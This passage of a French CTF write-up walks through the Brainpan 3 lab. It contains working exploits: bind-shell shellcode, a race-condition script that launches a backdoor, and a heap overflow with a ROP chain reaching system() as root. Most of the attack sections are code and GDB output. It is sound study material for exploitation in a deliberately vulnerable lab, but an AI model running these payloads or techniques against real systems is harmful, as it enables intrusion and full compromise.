(gdb) info reg ebp esp
ebp            0x0      0x0
esp            0xffffd42c       0xffffd42c
(gdb) x/wx $esp
0xffffd42c:     0xf7e03637  <-- adresse de retour qui pointe vers la libc (normal)
(gdb) x/i 0xf7e03637
   0xf7e03637 <__libc_start_main+247>:  add    $0x10,%esp
```

Et maintenant la version qui crashe :  

```plain
(gdb) r `python -c "print 'A'*116"` tatayoyo 
Starting program: /home/nico/VirtualBox VMs/brainpan3/cryptor `python -c "print 'A'*116"` tatayoyo

Breakpoint 1, 0x08048786 in ?? ()  <-- au moment de l'appel de la fonction principale
(gdb) info reg ebp esp
ebp            0xffffd428       0xffffd428
esp            0xffffd420       0xffffd420
(gdb) c
Continuing.
[+] saving to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.enc

Breakpoint 2, 0x08048746 in ?? ()  <-- sur le ret de la fonction principale
(gdb) info reg ebp esp
ebp            0xffffd400       0xffffd400  <-- octet de poids faible écrasé
esp            0xffffd41c       0xffffd41c
(gdb) x/wx $esp
0xffffd41c:     0x0804878b  <-- adresse de retour sur le main
(gdb) ni
0x0804878b in ?? ()
(gdb) x/3i $eip
=> 0x804878b:   mov    $0x0,%eax
   0x8048790:   leave  
   0x8048791:   ret    
(gdb) ni
0x08048790 in ?? ()  <-- leave + ret du main()
(gdb) ni
0x08048791 in ?? ()
(gdb) info reg ebp esp
ebp            0x41414141       0x41414141 <-- oups
esp            0xffffd404       0xffffd404
(gdb) x/wx $esp
0xffffd404:     0x41414141 <-- adresse de retour sous contrôle :)
```

L'exploitation est rendue aisée par le fait que le second argument passé à *cryptor* est copié vers une variable globale à l'adresse fixe *0x080486ad*. On peut donc passer notre shellcode directement en second argument et mettre cette adresse comme adresse de retour (la stack est ici exécutable et le format de la clé n'est pas vérifié).  

J'ai écrit l'exploit suivant. Le shellcode est un bind + fork trouvé sur *exploit-db* comme ça j'ai toujours un shell *reynard* qui m'attend sur le port 31337 :)  

```python
from __future__ import print_function
import struct
import subprocess
from string import ascii_letters

# Le fichier ne doit pas exister pour que l'exploit reussisse !
shellcode = '\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80'
shellcode = (
    "\x6a\x66"              # push $0x66 
    "\x58"                  # pop %eax 
    "\x99"                  # cltd 
    "\x6a\x01"              # push $0x1 
    "\x5b"                  # pop %ebx 
    "\x52"                  # push %edx 
    "\x53"                  # push %ebx 
    "\x6a\x02"              # push $0x2 

    #
    # <_doint>:
    #

    "\x89\xe1"              # mov %esp,%ecx 
    "\xcd\x80"              # int $0x80 

    "\x5b"                  # pop %ebx 
    "\x5d"                  # pop %ebp 
    "\x52"                  # push %edx 
    "\x66\xbd\x69\x7a"      # mov $0x7a69,%bp (0x7a69 = 31337)
    "\x0f\xcd"              # bswap %ebp 
    "\x09\xdd"              # or %ebx,%ebp 
    "\x55"                  # push %ebp 
    "\x6a\x10"              # push $0x10 
    "\x51"                  # push %ecx 
    "\x50"                  # push %eax 
    "\x89\xe1"              # mov %esp,%ecx 
    "\xb0\x66"              # mov $0x66,%al 
    "\xcd\x80"              # int $0x80 
    "\xb3\x04"              # mov $0x4,%bl 
    "\xb0\x66"              # mov $0x66,%al 
    "\xcd\x80"              # int $0x80 

    #
    # <_acceptloop>:
    #

    "\x5f"                  # pop %edi 
    "\x50"                  # push %eax 
    "\x50"                  # push %eax 
    "\x57"                  # push %edi 
    "\x89\xe1"              # mov %esp,%ecx 
    "\x43"                  # inc %ebx 
    "\xb0\x66"              # mov $0x66,%al 
    "\xcd\x80"              # int $0x80 
    "\x93"                  # xchg %eax,%ebx 
    "\xb0\x02"              # mov $0x2,%al 
    "\xcd\x80"              # int $0x80 
    "\x85\xc0"              # test %eax,%eax 
    "\x75\x1a"              # jne <_parent> 
    "\x59"                  # pop %ecx 

    #
    # <_dup2loop>:
    #

    "\xb0\x3f"              # mov $0x3f,%al
    "\xcd\x80"              # int $0x80
    "\x49"                  # dec %ecx
    "\x79\xf9"              # jns <_dup2loop>

    "\xb0\x0b"              # mov $0xb,%al
    "\x68\x2f\x2f\x73\x68"  # push $0x68732f2f
    "\x68\x2f\x62\x69\x6e"  # push $0x6e69622f
    "\x89\xe3"              # mov %esp,%ebx
    "\x52"                  # push %edx
    "\x53"                  # push %ebx
    "\xeb\xb2"              # jmp <_doint>

    #
    # <_parent>:
    #

    "\x6a\x06"              # push $0x6
    "\x58"                  # pop %eax
    "\xcd\x80"              # int $0x80
    "\xb3\x04"              # mov $0x4,%bl
    "\xeb\xc9"             # jmp <_acceptloop>
)
filename = ""
for letter in ascii_letters[:116/4]:
    if ord(letter) == 0x76:
        filename += struct.pack("<I", 0x804a080)
        continue
    filename += letter * 4

print(len(filename))

print("./cryptor", '$' + repr(filename), '$' + repr(shellcode))

p = subprocess.Popen(
    ["./cryptor", filename, shellcode],
    env={},
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    shell=False
)

print("Now try to connect to local port 31337")
```

Sprint
------

Miantenant que l'on a accès à */mnt/usb.key.txt* on peut exploiter la race condition dans *trixd*. Ça marche au premier essai :  

```python
import socket
import os

sock = socket.socket()
# trixd ne vérifie pas l'absence du fichier, le check passe s'il est absent
os.unlink("/mnt/usb/key.txt")
sock.connect(("127.0.0.1", 7075))
# Met en place le symlink avant que le strcmp prenne place
os.symlink("/home/puck/key.txt", "/mnt/usb/key.txt")
sock.send("id; python /tmp/backdoor.py &\n")
buff = sock.recv(1024)
if "Incorrect" not in buff:
    print(buff)
```

```bash
$ python exploit_trixd.py
Authentication successful
uid=1001(puck) gid=1004(dev) groups=1001(puck)
```

On aura préalablement placé une backdoor Python à l'emplacement */tmp/backdoor.py* nous donnant un shell sur le port 9999.  

```plain
$ nc 127.0.0.1 9999 -v
Connection to 127.0.0.1 9999 port [tcp/*] succeeded!
puck@brainpan3:/$ id
uid=1001(puck) gid=1004(dev) groups=1001(puck)
```

On s'empresse de recopier le contenu de la clé de *puck* (*HBN48HY71ERG5GA6290V*) dans */mnt/usb/key.txt* pour les accès futurs :p  

Rop hop hop ? Exploit !
-----------------------

Avec la possibilité d'écrire dans le dossier */opt/.messenger* on est donc en face de ce qui est très certainement la dernière étape du CTF :)  

Ce binaire prend deux arguments : un entier correspondant à un niveau de priorité ainsi qu'un nom de fichier.  

Ce dernier doit être formaté spécifiquement comme indiqué dans le message d'usage :  

```plain
Message file format: requestername|message
Eg: tony|Add a new user to repo
Can have multiple messages in a single file separated by newlines.
Eg: tony|Please remove /tmp/foo
    cate|Reset password request.
```

Si on lit le code assembleur du *main()* on remarque la création de trois buffers alloués sur le tas de tailles respectives de 400, 20 et 100 octets.  

On passe ensuite par 3 boucles successives :  

* une boucle de comptage de lignes via *getlines()*
* une boucle de *malloc()* qui pour chaque ligne alloue des buffers de 12, 10 et de 200 octets
* une boucle qui traite chaque ligne avec un *strtok()* pour les couper au niveau du caractère pipe et recopie à l'aide de *str(n)cpy()* les deux parties vers chacun des buffer alloués

Ces éléments sont stockés dans des structures et leurs adresses sont stockées dans un tableau dans la stack situé à *ebp-0x44*. On peut schématiser ainsi :  

![Brainpan 3 CTF msg_admin memory structures](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_msg_admin_memory.png)

On a donc dans le tableau des adresses vers des structures d'une taille de 12 octets (3 dwords) stockées sur le tas.  

Chaque structure est composée de la priorité (premier dword), de l'adresse du nom d'utilisateur (stocké sur le tas aussi) et de l'adresse du message (sur le tas aussi).  

Le fonctionnement du programme fait que tous les chunks se suivent, comme on peut l'observer avec GDB :  

```plain
(gdb) x/4wx $ebp-0x44
0xffffd444:     0x0804d790      0x0804d880      0x0804d970      0x00008000
(gdb) x/90wx 0x0804d790
0x804d790:      0x00007a69      0x0804d7a0      0x0804d7b0      0x00000011
0x804d7a0:      0x7769626f      0x00006e61      0x00000000      0x000000d1
0x804d7b0:      0x6c6c6568      0x6874206f      0x00657265      0x00000000
0x804d7c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d7d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d7e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d7f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d810:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d820:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d830:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d840:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d850:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d860:      0x00000000      0x00000000      0x00000000      0x00000000
0x804d870:      0x00000000      0x00000000      0x00000000      0x00000011
0x804d880:      0x00007a69      0x0804d890      0x0804d8a0      0x00000011
0x804d890:      0x32643272      0x00000000      0x00000000      0x000000d1
0x804d8a0:      0x7a7a7a62      0x6964207a      0x0000676e      0x00000000
```

Les habitués auront compris que les valeurs *11* et *d1* dans ce dump correspondent à des entêtes de chunks (size et flags).  

La vulnérabilité réside ici sur l'emploi d'un *strcpy()* qui permet un buffer overflow sur le tas et ainsi écraser les adresses présentes. Adresses qui sont utilisées dans la boucle comme destinations d'autres *strcpy()*.  

Par tâtonnement on peut forger facilement un PoC permettant d'écrire à une adresse de notre choix :  

```plain
HellooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooAAAA|Hello there
devloop|tatayoyo
```

```bash
$ ./msg_admin 0 crash_message.txt
[+] Recording 2 entries
[1]    14446 segmentation fault (core dumped)  ./msg_admin 0 crash_message.txt
$ dmesg|tail -1
[204496.864873] msg_admin[14446]: segfault at 41414141 ip 00000000f7e6b2f2 sp 00000000fff32dbc error 6 in libc-2.23.so[f7de4000+1b0000]
```

On contrôle ici non seulement l'adresse de destination du *strcpy()* mais aussi le contenu pointé par la source. Un cas de write-what-where 5 étoiles :)  

Côté difficultés le binaire a une stack non exécutable et stack protector (canary). Sans compter que l'on ne communique pas directement avec le programme : on ne peut pas obtenir son output et essayer de leaker une adresse de la libc...  

L'objectif est de mettre en place une chaîne de ROPs qui peut fonctionner sans intervention de notre part. Notre chaîne devra donc :  

1. Récupérer une adresse de fonction (ou d'un symbole quelconque) de la libc
2. Ajouter à cette valeur le décalage nécessaire pour pointer sur la fonction *system()* (on utilise *objdump* sur la libc pour avoir les offsets des deux symboles et on soustrait pour la différence)
3. Sauter sur ou appeler cette adresse avec comme argument le path d'un binaire que l'on contrôle

A l'aide de [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) on peut trouver des suites d'instructions pour réaliser certaines étapes.  

```asm
0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret
```

Avec un contrôle de ebx on peut ici récupérer la valeur à une adresse donnée :)  

Mais avant cela il faut s'assurer que eax a une valeur fixe. Le gadget suivant est un peu bizarre mais il met eax à 3 :  

```asm
0x08048760 : mov eax, 0x804b077 ; sub eax, 0x804b074 ; cmp eax, 6 ; ja 0x804877f ; ret
```

On aura besoin de définir ebx à de multiples reprises :  

```asm
0x0804859d : pop ebx ; ret
```

Et pour le final :  

```asm
0x08048786 : call eax
```

Pour le path à passer à *system()* il y a le */tmp/foo* vu plus tôt.  

Il ne reste qu'à trouver un gadget de *stack pivot*, celui qui va faire pointer le sommet de la stack vers les données que l'on contrôle et rendre tout le reste possible.  

Après recherche et essai ce dernier est impeccable :  

```asm
0x08048dd9 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
```

Notre write-what-where servira à remplacer l'adresse d'une fonction dans la GOT par l'adresse du stack-pivot.  

*strtok()* est le parfait candidat à écraser car c'est la fonction qui suit immédiatement l'appel à *strcpy()* dans le code.  

J'ai donc écrit un exploit qui fonctionnait très bien en local avec une distribution et une version différence de la libc.  

Pour l'adapter il suffisait de retrouver en mémoire des valeurs dont la somme correspond au décalage entre *atol()* (symbole choisit) et *system()*.  

Simple... sauf qu'évidemment au moment de l'exploitation ça ne marchait pas. La stack était légèrement différente sur la distribution du CTF (confirmé en mettant en place une VM Trusty 14.04.2 et en m'assurant que la libc correspondait). La fin de la ROP chain était écrasé par des octets nuls, à croire que *strtok()* ou autre chose fonctionnait différemment.  

J'utilisais une addition avec 4 variables glanées par tâtonnement... Pour résoudre le bug il fallait trouver des chiffres en mémoire permettant une addition en trois chiffres maximum.  

Il faut aussi vérifier qu'aucun des octets d'adresse ne correspond à pipe ou à un retour à la ligne.  

Pour cela j'ai écrit le code suivant (il fait le job mais n'est pas performant) :  

```python
from collections import defaultdict
import struct

import numpy

BASE = 0x08048000
TARGET = numpy.uint32(0xe8fd)

values = defaultdict(list)
with open("msg_admin", "rb") as fd:
    offset = 0
    while True:
        buff = fd.read(4)
        if len(buff) != 4:
            break

        value = struct.unpack("<I", buff)[0]
        values[numpy.uint32(value)].append(BASE + offset)
        offset += 4

cases = set()
for value1 in values:
    for value2 in values:
        for value3 in values:
            if frozenset({value1, value2, value3}) in cases:
                continue

            if value1 + value2 + value3 == TARGET:
                print("value 1 is", value1)
                print("addresses:", ", ".join([hex(addr) for addr in values[value1]]))

                print("value 2 is", value2)
                print("addresses:", ", ".join([hex(addr) for addr in values[value2]]))

                print("value 3 is", value3)
                print("addresses:", ", ".join([hex(addr) for addr in values[value3]]))
                cases.add(frozenset({value1, value2, value3}))
                print('')

```

Mon exploit final :   

```python
import struct

STRTOK = 0x804b05c  # objdump -D msg_admin| grep -A2 strtok
PIVOT = 0x08048dd9  # add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
EAX_3 = 0x08048760  # mov eax, 0x804b077 ; sub eax, 0x804b074 ; cmp eax, 6 ; ja 0x804877f ; ret
POP_EBX = 0x0804859d  # pop ebx ; ret
ATOL = 0x804b04c
OVERWRITE = 0x08048feb  # add eax, dword ptr [ebx + 0x1270304] ; ret
CALL_EAX = 0x08048786
FOO = 0x8048eef

LIBC_SYSTEM_OFFSET = 0x00040190
LIBC_ATOL_OFFSET = 0x00031890
# diff is 0xe900, need to add 0xe8fd as eax will be 3

GROW_1 = 0x8048444  # 0x0000302e
GROW_2 = 0x80488e4  # 0x0000b8c2
GROW_3 = 0x8049f24  # 0x0000000d

with open("bad_message.msg", "wb") as fd:
    fd.write(b"z"*228)
    fd.write(struct.pack("<I", STRTOK))
    fd.write(b"|")
    fd.write(b"A"*28)
    # start of our ROP chain
    fd.write(struct.pack("<I", EAX_3))

    fd.write(struct.pack("<I", POP_EBX))
    fd.write(struct.pack("<I", ATOL - 0x1270304))
    fd.write(struct.pack("<I", OVERWRITE))  # eax is now atol@@GLIBC+3

    # we still have to add 0xe8fd to eax to make it point to system
    fd.write(struct.pack("<I", POP_EBX))
    fd.write(struct.pack("<I", GROW_1 - 0x1270304))  # add 0x302e
    fd.write(struct.pack("<I", OVERWRITE))

    # still 0xb8cf to add
    fd.write(struct.pack("<I", POP_EBX))
    fd.write(struct.pack("<I", GROW_2 - 0x1270304))
    fd.write(struct.pack("<I", OVERWRITE))

    # still 0xd to add
    fd.write(struct.pack("<I", POP_EBX))
    fd.write(struct.pack("<I", GROW_3 - 0x1270304))
    fd.write(struct.pack("<I", OVERWRITE))

    fd.write(struct.pack("<I", CALL_EAX))
    fd.write(struct.pack("<I", FOO))

    fd.write(b"A"*24)
    fd.write(b"\n")

    fd.write(struct.pack("<I", PIVOT))
    fd.write(b"lorem ipsum\n")
```

On copie le fichier généré dans */opt/.messenger* et notre backdoor */tmp/foo* est exécutée, nous donnant les droits root et l'accès au flag qui est sous format TROFF (manpage) :)  

![Brainpan 3 final flag](https://raw.githubusercontent.com/devl00p/blog/master/images/brainpan_3/bp3_flag.png)

Outro dramatique
----------------

Une grande satisfaction d'avoir terminé ce 3ème opus de *Brainpan*. Merci à [superkojiman](https://twitter.com/@superkojiman) pour les arrachages de cheveux et le pétage de neurones :)  

PS: en lisant les writeups d'autres participants il s'avère que l'on peut simplement activer la fonctionnalité *report* sur le service initial en passant un nom de session avec beaucoup de Y qui écraseront les valeurs sur la stack :p

*Published June 18 2019 at 14:57*